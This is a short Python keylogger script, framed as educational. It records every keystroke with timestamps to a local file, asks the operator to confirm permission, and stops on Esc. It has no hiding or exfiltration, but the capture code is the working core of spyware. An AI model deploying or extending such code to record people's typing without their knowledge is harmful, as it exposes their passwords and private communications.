# WARNING: THIS SCRIPT IS FOR EDUCATIONAL AND ETHICAL PURPOSES ONLY.
# DO NOT USE THIS SCRIPT FOR MALICIOUS ACTIVITIES.
# ALWAYS OBTAIN EXPLICIT, WRITTEN PERMISSION FROM THE DEVICE OWNER BEFORE RUNNING.

import pynput.keyboard
import logging
import os
import time

# --- Configuration ---
LOG_FILE = "keylog.txt"
STOP_KEY = pynput.keyboard.Key.esc

def setup_logging():
    """Configures the logging settings to save keystrokes to a file."""
    # Ensure the log file is clean before starting a new session
    if os.path.exists(LOG_FILE):
        os.remove(LOG_FILE)
        
    logging.basicConfig(
        filename=LOG_FILE,
        level=logging.DEBUG,
        format='%(asctime)s: %(message)s'
    )

def on_press(key):
    """This function is called whenever a key is pressed."""
    try:
        # For alphanumeric keys, log the character itself
        logging.info(f"Key pressed: {key.char}")
    except AttributeError:
        # For special keys (e.g., space, enter, shift), log their name
        logging.info(f"Special key pressed: {key}")

def on_release(key):
    """This function is called whenever a key is released."""
    if key == STOP_KEY:
        # Stop the listener by returning False
        print(f"\n'{STOP_KEY}' pressed. Stopping keylogger.")
        return False

def main():
    """Main function to run the keylogger."""
    print("--- Simple Keylogger for Ethical Use ---")
    
    consent = input("\nDo you have permission to run this tool on this device? (yes/no): ")
    if consent.lower() != 'yes':
        print("Permission not granted. Exiting.")
        return

    setup_logging()
    
    print(f"\nLogging keystrokes... Press the '{STOP_KEY}' key to stop.")
    
    # Create and start the keyboard listener
    with pynput.keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
        
    print(f"\nKeylogger stopped. Keystrokes were saved to '{LOG_FILE}'.")

if __name__ == "__main__":
    main() 
